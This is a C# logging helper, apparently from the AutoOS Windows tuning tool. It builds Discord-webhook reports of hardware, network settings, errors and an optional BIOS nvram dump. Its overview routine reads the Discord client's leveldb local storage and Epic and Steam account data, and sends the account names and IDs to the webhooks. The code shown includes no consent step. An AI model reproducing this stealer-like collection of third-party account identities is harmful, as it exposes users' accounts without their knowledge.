using AutoOS.Core.Helpers.Device.Models;
using AutoOS.Core.Helpers.Device;
using AutoOS.Core.Helpers.GPU.Models;
using AutoOS.Core.Helpers.GPU;
using AutoOS.Core.Helpers.Monitor;
using AutoOS.Core.Helpers.OS;
using AutoOS.Core.Helpers.RAM;
using AutoOS.Core.Helpers.Database;
using AutoOS.Core.Helpers.Games;
using AutoOS.Core.Helpers.Sound;
using DevWinUI;
using System.Net.Http.Headers;
using System.Net.Security;
using System.Security.Authentication;
using System.Text.Json.Nodes;
using System.Text;
using Windows.Storage;

namespace AutoOS.Core.Helpers.Logging;

public static partial class LogHelper
{
    private static readonly ApplicationDataContainer localSettings = ApplicationData.Current.LocalSettings;

    private static readonly HttpClient httpClient = new(new SocketsHttpHandler
		{
			SslOptions = new SslClientAuthenticationOptions
			{
				EnabledSslProtocols = SslProtocols.Tls12 | SslProtocols.Tls13
			}
		})
		{
			DefaultRequestHeaders =
			{
				UserAgent =
				{
					new ProductInfoHeaderValue("AutoOS", ProcessInfoHelper.Version)
				}
			}
		};

    public static async Task Log(IEnumerable<GpuInfo> selectedGpus = null, bool bios = false)
    {
        var embed = GetOverview(selectedGpus, false);
        var webhookPayload = new JsonObject
        {
            ["embeds"] = new JsonArray { embed }
        };

        using var multipart = new MultipartFormDataContent
        {
            { new StringContent(webhookPayload.ToJsonString()), "payload_json" }
        };

        if (bios)
        {
            string nvramPath = Path.Combine(PathHelper.GetAppDataFolderPath(), "SCEWIN", "nvram.txt");
            if (File.Exists(nvramPath))
            {
                multipart.Add(new ByteArrayContent(File.ReadAllBytes(nvramPath)), "file", "nvram.txt");
            }
        }

        string webhook = bios ? LogConfig.Bios : LogConfig.Log;
        if (!string.IsNullOrEmpty(webhook))
        {
            await httpClient.PostAsync(webhook, multipart);
        }
    }

    public static async Task LogError(Exception ex, IEnumerable<GpuInfo> selectedGpus = null, string actionTitle = null)
    {
        var embed = GetOverview(selectedGpus, true, ex, actionTitle);
        var webhookPayload = new JsonObject
        {
            ["embeds"] = new JsonArray { embed }
        };

        using var multipart = new MultipartFormDataContent
        {
            { new StringContent(webhookPayload.ToJsonString()), "payload_json" }
        };

        if (!string.IsNullOrEmpty(LogConfig.Error))
        {
            await httpClient.PostAsync(LogConfig.Error, multipart);
        }
    }

    public static async Task LogNetworkSettings(IEnumerable<GpuInfo> selectedGpus = null)
    {
        var embed = GetOverview(selectedGpus, false);
        var webhookPayload = new JsonObject
        {
            ["embeds"] = new JsonArray { embed }
        };

        using var multipart = new MultipartFormDataContent
        {
            { new StringContent(webhookPayload.ToJsonString()), "payload_json" }
        };

        var devices = DeviceHelper.GetDevices(DeviceType.NIC);
        var sb = new StringBuilder();

        foreach (var device in devices)
        {
            if (device.NicType != NicDeviceType.WiFi && device.NicType != NicDeviceType.LAN) continue;

            sb.AppendLine($"# Adapter: {device.FriendlyName}");
            sb.AppendLine($"- **PnpID**: `{device.PnpDeviceId}`");
            sb.AppendLine($"- **RegistryPath**: `{device.RegistryPath}`");
            sb.AppendLine($"- **Driver**: `{device.DriverType} {device.CurrentVersion}`");

            var settings = AutoOS.Core.Helpers.Network.NetworkHelper.GetAdvancedSettings(device);
            foreach (var setting in settings.OrderBy(s => s.Name))
            {
                sb.AppendLine();
                sb.AppendLine($"## {setting.Name}");
                sb.AppendLine($"- **Key**: `{setting.Key}`");
                sb.AppendLine($"- **Type**: `{setting.Type}`");

                var currentOption = setting.Options.FirstOrDefault(o => o.Value == setting.CurrentValue);
                string currentText = currentOption != null ? $" ({currentOption.Name})" : "";
                sb.AppendLine($"- **Current Value**: `{setting.CurrentValue}`{currentText}");

                if (!string.IsNullOrEmpty(setting.DefaultValue))
                {
                    var defaultOption = setting.Options.FirstOrDefault(o => o.Value == setting.DefaultValue);
                    string defaultText = defaultOption != null ? $" ({defaultOption.Name})" : "";
                    sb.AppendLine($"- **Default Value**: `{setting.DefaultValue}`{defaultText}");
                }

                sb.AppendLine("- **Parameters**:");
                foreach (var meta in setting.RawMetadata.OrderBy(m => m.Key))
                {
                    sb.AppendLine($"  - **{meta.Key}**: `{meta.Value}`");
                }

                if (setting.Type == Network.Models.NetworkSettingType.Enum && setting.Options.Count > 0)
                {
                    sb.AppendLine("- **Options**:");
                    foreach (var opt in setting.Options)
                    {
                        sb.AppendLine($"  - `{opt.Value}`: {opt.Name}");
                    }
                }
            }

            sb.AppendLine();
            sb.AppendLine("---");
            sb.AppendLine();
        }

        if (sb.Length > 0 && !string.IsNullOrEmpty(LogConfig.Network))
        {
            multipart.Add(new ByteArrayContent(Encoding.UTF8.GetBytes(sb.ToString())), "file", "network_settings.md");
            await httpClient.PostAsync(LogConfig.Network, multipart);
        }
    }

    private static JsonObject GetOverview(IEnumerable<GpuInfo> selectedGpus = null, bool includeVendorId = false, Exception ex = null, string actionTitle = null)
    {
        var discordAccounts = DiscordHelper.GetAccountData(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "discord", "Local Storage", "leveldb"));
        var epicAccounts = EpicGamesHelper.GetEpicGamesAccounts();
        var steamAccounts = SteamHelper.GetSteamAccounts();

        string cpuName = Microsoft.Win32.Registry.GetValue(@"HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\CentralProcessor\0", "ProcessorNameString", "")?.ToString() ?? "";
        string manufacturer = Microsoft.Win32.Registry.GetValue(@"HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\BIOS", "BaseBoardManufacturer", "")?.ToString() ?? "";
        string product = Microsoft.Win32.Registry.GetValue(@"HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\BIOS", "BaseBoardProduct", "")?.ToString() ?? "";
        string motherboard = $"{manufacturer} {product}".Trim();

        var ramInfo = RamHelper.GetRam();
        string ram = ramInfo != null ? $"{ramInfo.CapacityGB:N1} GB {ramInfo.DDRVersion} @ {ramInfo.MaxSpeedMHz} MHz" : "N/A";

        var currentGpus = GpuHelper.GetGPUs();
        string gpus = string.Join("\n", currentGpus.Select(gpu =>
        {
            bool install = selectedGpus?.FirstOrDefault(x => x.PnPDeviceId == gpu.PnPDeviceId)?.Install ?? true;
            return $"{gpu.DeviceName} (DeviceId: {gpu.DeviceId}, Install: {install}, {gpu.CurrentVersion})";
        }));

        string monitors = string.Join("\n", MonitorHelper.GetMonitors().Select(m => $"{m.DeviceName} ({m.Resolution.Width}x{m.Resolution.Height} @ {m.RefreshRate} Hz)"));

        var nicsList = DeviceHelper.GetDevices(DeviceType.NIC);
        string nics = nicsList.Count > 0 ? string.Join("\n", nicsList.Select(n =>
        {
            string vendorPart = includeVendorId ? $", VendorId: {n.VendorId}" : "";
            return $"{n.FriendlyName} (DeviceId: {n.DeviceId}{vendorPart}, Current Version: {n.DriverType} {n.CurrentVersion}, Connected: {n.IsActive})";
        })) : "N/A";

        var audioParts = new List<string>();

        var outputDevice = SoundHelper.GetDefaultAudioDeviceInfo(Windows.Win32.Media.Audio.EDataFlow.eRender);
        if (outputDevice != null)
        {
            var outputDetails = SoundHelper.GetAudioDetails(outputDevice);
            var outputBuffers = SoundHelper.GetBufferSizes(outputDevice);
            var currentBuffer = outputBuffers.FirstOrDefault(buffer => buffer.IsCurrent);

            string outputFormat = $"{outputDetails.CurrentChannels} channels, {outputDetails.CurrentBitDepth} bit, {outputDetails.CurrentSampleRate} Hz";
            string outputBuffer = currentBuffer != null ? $"{currentBuffer.Frames} samples" : "N/A";
            audioParts.Add($"{outputDevice.FriendlyName} ({outputFormat}, {outputBuffer})");
        }

        var inputDevice = SoundHelper.GetDefaultAudioDeviceInfo(Windows.Win32.Media.Audio.EDataFlow.eCapture);
        if (inputDevice != null)
        {
            var inputDetails = SoundHelper.GetAudioDetails(inputDevice);
            var inputBuffers = SoundHelper.GetBufferSizes(inputDevice);
            var currentBuffer = inputBuffers.FirstOrDefault(buffer => buffer.IsCurrent);

            string inputFormat = $"{inputDetails.CurrentChannels} channels, {inputDetails.CurrentBitDepth} bit, {inputDetails.CurrentSampleRate} Hz";
            string inputBuffer = currentBuffer != null ? $"{currentBuffer.Frames} samples" : "N/A";
            audioParts.Add($"{inputDevice.FriendlyName} ({inputFormat}, {inputBuffer})");
        }

        string audioInfo = audioParts.Count > 0 ? string.Join("\n", audioParts) : "N/A";

        var embed = new JsonObject
        {
            ["color"] = ex != null ? 4466470 : 3751195,
            ["fields"] = new JsonArray
            {
                new JsonObject
                {
                    ["name"] = "Discord",
                    ["value"] = discordAccounts != null && discordAccounts.Count > 0 ? string.Join("\n", discordAccounts.Select(a => $"{a.Username} <@{a.UserId}>{(a.IsActive ? " [Active]" : "")}")) : "N/A",
                    ["inline"] = true
                },
                new JsonObject
                {
                    ["name"] = "Epic Games",
                    ["value"] = epicAccounts != null && epicAccounts.Count > 0 ? string.Join("\n", epicAccounts.Select(a => $"{a.DisplayName}{(a.IsActive ? " [Active]" : "")}")) : "N/A",
                    ["inline"] = true
                },
                new JsonObject
                {
                    ["name"] = "Steam",
                    ["value"] = steamAccounts != null && steamAccounts.Count > 0 ? string.Join("\n", steamAccounts.Select(a => $"[{a.AccountName}](https://steamcommunity.com/profiles/{a.Steam64Id}){(a.AllowAutoLogin ? " [Active]" : "")}")) : "N/A",
                    ["inline"] = true
                },
                new JsonObject
                {
                    ["name"] = "Motherboard",
                    ["value"] = motherboard,
                    ["inline"] = false
                },
                new JsonObject
                {
                    ["name"] = "CPU",
                    ["value"] = cpuName,
                    ["inline"] = false
                },
                new JsonObject
                {
                    ["name"] = "RAM",
                    ["value"] = ram,
                    ["inline"] = false
                },
                new JsonObject
                {
                    ["name"] = "GPUs",
                    ["value"] = gpus,
                    ["inline"] = false
                },
                new JsonObject
                {
                    ["name"] = "Displays",
                    ["value"] = monitors,
                    ["inline"] = false
                },
                new JsonObject
                {
                    ["name"] = "NICs",
                    ["value"] = nics,
                    ["inline"] = false
                },
                new JsonObject
                {
                    ["name"] = "Audio Devices",
                    ["value"] = audioInfo,
                    ["inline"] = false
                },
                new JsonObject
                {
                    ["name"] = "OS Build",
                    ["value"] = OSHelper.GetWindowsVersionString(),
                    ["inline"] = true
                },
                new JsonObject
                {
                    ["name"] = "Installation Details",
                    ["value"] = $"Start: {localSettings.Values["Install_Start"]?.ToString() ?? "N/A"}\nEnd: {localSettings.Values["Install_End"]?.ToString() ?? "N/A"}\nVersion: {localSettings.Values["Install_Version"]?.ToString() ?? "N/A"}\nBuild: {localSettings.Values["Install_Build"]?.ToString() ?? "N/A"}",
                    ["inline"] = true
                }
            },
            ["footer"] = new JsonObject
            {
                ["text"] = $"AutoOS {ProcessInfoHelper.Version}"
            }
        };

        if (discordAccounts?.FirstOrDefault(active => active.IsActive) is var activeDiscordAccount)
        {
            embed["author"] = new JsonObject
            {
                ["name"] = activeDiscordAccount.Username,
                ["icon_url"] = $"https://cdn.discordapp.com/avatars/{activeDiscordAccount.UserId}/{activeDiscordAccount.Avatar}.webp?size=64",
                ["url"] = $"https://discord.com/users/{activeDiscordAccount.UserId}"
            };
        }

        if (ex != null)
        {
            var errorSb = new StringBuilder();
            errorSb.AppendLine($"{ex.GetType().FullName}");
            errorSb.AppendLine($"Message: {ex.Message}");
            errorSb.AppendLine($"HResult: 0x{ex.HResult:X}");
            errorSb.AppendLine($"Source: {ex.Source}");
            errorSb.AppendLine(ex.StackTrace);
            if (ex.InnerException != null)
            {
                errorSb.AppendLine("**InnerException:**");
                errorSb.AppendLine(ex.InnerException.ToString());
            }
            if (!string.IsNullOrEmpty(actionTitle))
            {
                errorSb.AppendLine($"**Action Title:** {actionTitle}");
            }

            var errorField = new JsonObject
            {
                ["name"] = "Error Details",
                ["value"] = errorSb.ToString(),
                ["inline"] = false
            };

            ((JsonArray)embed["fields"]).Insert(10, errorField);
        }

        return embed;
    }
}
